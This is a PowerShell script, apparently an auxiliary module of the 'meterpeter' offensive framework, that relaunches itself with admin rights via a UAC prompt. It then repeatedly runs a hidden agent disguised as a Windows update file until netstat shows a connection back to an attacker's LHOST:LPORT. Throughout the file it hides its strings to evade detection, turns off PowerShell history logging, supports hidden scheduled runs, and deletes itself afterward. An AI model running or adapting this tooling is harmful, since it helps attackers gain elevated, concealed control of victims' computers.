<#
.SYNOPSIS
   UAC Auto-Elevate meterpeter client agent

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: none
   Optional Dependencies: netstat
   PS cmdlet Dev version: v1.0.8

.DESCRIPTION
   Auxiliary module of Meterpeter v2.10.14 that allow users to
   elevate current terminal session from user -> administrator

.NOTES
   Warning: Target user will be prompt by UAC to run elevated.
   Warning: cmdlet will exit execution if target declines to run
   it with admin privileges by sellecting 'NO' button in UAC prompt
   Warning: Parameter -attacker 'LHOST:LPORT' allows this cmdlet to
   check for agent conection [loop] or abort cmdlet execution if any
   connection from server <-> client is found active (breaking loop)

.Parameter Attacker
   Attacker LHOST:LPORT (default: off)

.Parameter StartTime
   Schedule execution to HH:mm (default: off)

.Parameter AgentPath
   Agent (default: $Env:TMP\Update-KB5005101.ps1)

.Parameter AutoDel
   Switch that auto-deletes this cmdlet in the end

.EXAMPLE
   PS C:\> .\uaceop.ps1 -agentpath "$pwd\evil.ps1"
   try to elevate evil.ps1 privileges only once
  
.EXAMPLE
   PS C:\> .\uaceop.ps1 -attacker '192.168.1.66:666' -autodel
   Loop agent execution until a connection its found active

.EXAMPLE
   PS C:\> .\uaceop.ps1 -starttime '09:34' -attacker '192.168.1.66:666' -autodel
   Schedule execution to HH:mm + loop agent execution until a connection its found active

.EXAMPLE
   PS C:\> Start-Process -windowstyle hidden -argumentlist "-file uaceop.ps1 -starttime '09:34' -attacker '192.168.1.66:666' -autodel"
   Hidden schedule execution of beacon to HH:mm + loop agent execution until a connection its found active + autodelete this cmdlet

.INPUTS
   None. You cannot pipe objects into UacEop.ps1

.OUTPUTS
   [*] Relaunch console as an elevated process!
   [1] Executing meterpeter client [Comfirm]
   [ ] Waiting connection from remote server ..
   [2] Executing meterpeter client [Comfirm]
   [-] Remote connection found, exit loop ..

.LINK
   https://github.com/r00t-3xp10it/meterpeter
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$AgentPath="$Env:TMP\Update-KB5005101.ps1",
   [string]$StartTime="off",
   [string]$Attacker="off",
   [switch]$AutoDel
)


## Global variable declarations
$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

## Send Attacker settings to logfile its a mandatory step
# because the 2 time, cmdlet exec with default parameters
echo "Server: $Attacker" >> "$Env:TMP\Programdata.log"
echo "Client: $AgentPath" >> "$Env:TMP\Programdata.log"

if(-not($Attacker -match '^(off)$'))
{
   ## Make sure user inputed the correct lhost:lport format
   # Regex translated to human  1  9  2 .  1  6  8 .  ?  .    ?   :  ?
   If(-not($Attacker -match '^(\d\d\d\.\d\d\d\.\d*\.)+[\d*]+:[\d*]+$'))
   {
      write-host "`n[x] Error: wrong LHOST:LPORT format input`n" -ForegroundColor Red
      Remove-Item -Path "$Env:TMP\Programdata.log" -Force
      Start-Sleep -Seconds 2
      return
   }
}


If($StartTime -Match '^(\d\d:\d\d)$')
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Sleep for xx minutes function.
   #>

   write-host "[*] Schedule start at [" -NoNewline
   write-host "$StartTime" -ForegroundColor Red -NoNewline
   write-host "] hours."

   For(;;)
   {
      ## Compare $CurrentTime with $StartTime
      $CurrentTime = (Get-Date -Format 'HH:mm')
      If($CurrentTime -Match "^($StartTime)$")
      {
         break # Continue execution now
      }

      ## loop each 10 seconds
      Start-Sleep -Seconds 10
   }
}


$Counter = 0 ## Set loop function counter to '0'
$Attacker = ((Get-Content -Path "$Env:TMP\Programdata.log"|findstr /C:"Server:"|Select-Object -First 1) -replace '^(Server: )','')
$AgentPath = ((Get-Content -Path "$Env:TMP\Programdata.log"|findstr /C:"Client:"|Select-Object -First 1) -replace '^(Client: )','')
$AdminRaw = "(£[S@ec£urit£y.P£r@inc£ipal.£Wi£nd@o£wsP£r@inc£ipal]£[S£e@cu£r@it£y.P£ri@n£ci@pa£l.W£i@nd£o@wsId@e£nti@ty]:£:G@e£tC£ur@re£n@t()).I@sI£nR@o£le@([£S£e@cu£ri@ty.P£ri@nc£ip@al.Wi£n@do£ws@Bu£il@tI£n@Ro£l@e]:£:A£d@mi£ni£s@tr£at@o£r)" -replace '(@|£)',''
$AdminCheck = $AdminRaw|&('XeX' -replace '^(X)','i')
If($AdminCheck -match '^(False)$')
{
   $Namelless = "%R@u%nA@s%" -replace '(@|%)',''
   write-host "[*] Relaunch console as an elevated process!"
   Start-Process -WindowStyle Hidden powershell "-File",('"{0}"' -f $MyInvocation.MyCommand.Path) -Verb $Namelless
   exit
}


If($Attacker -match '^(off)$')
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Execute agent WITHOUT confirm if connection has recived
   #>

   write-host "[*] Executing meterpeter client [Once]"
   Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $AgentPath"   
}
Else
{
   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Execute agent and CONFIRM if connection has recived

   .NOTES
      Agent [Update-KB5005101.ps1] will beacon home from 10 to 10
      seconds unless UACeop.ps1 its stoped or an active connection
      its found from server <-> Client using netstat native command
   #>

   For(;;)
   {
      $Counter = $Counter + 1
      write-host "[$Counter] Executing meterpeter client [Comfirm]"
      Start-Process -WindowStyle Hidden powershell -ArgumentList "-file $AgentPath"
      Start-Sleep -Seconds 10 ## Give extra time for agent to beacon home

      $CheckAgentConnection = (netstat -ano|findstr /C:"ESTABLISHED"|findstr /C:"$Attacker")
      If($CheckAgentConnection -match "$Attacker")
      {
         write-host "[-] Remote connection found, exit loop ..`n"
         break # Connection found, exit loop
      }
      Else
      {
         write-host "[ ] Waiting connection from remote server .." -ForegroundColor Yellow
      }
   }
}


If($AutoDel.IsPresent)
{
   ## Auto-Delete cmdlet in the end ...
   Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
}

Start-Sleep -Seconds 2
Remove-Item -Path "$Env:TMP\Programdata.log" -Force
exit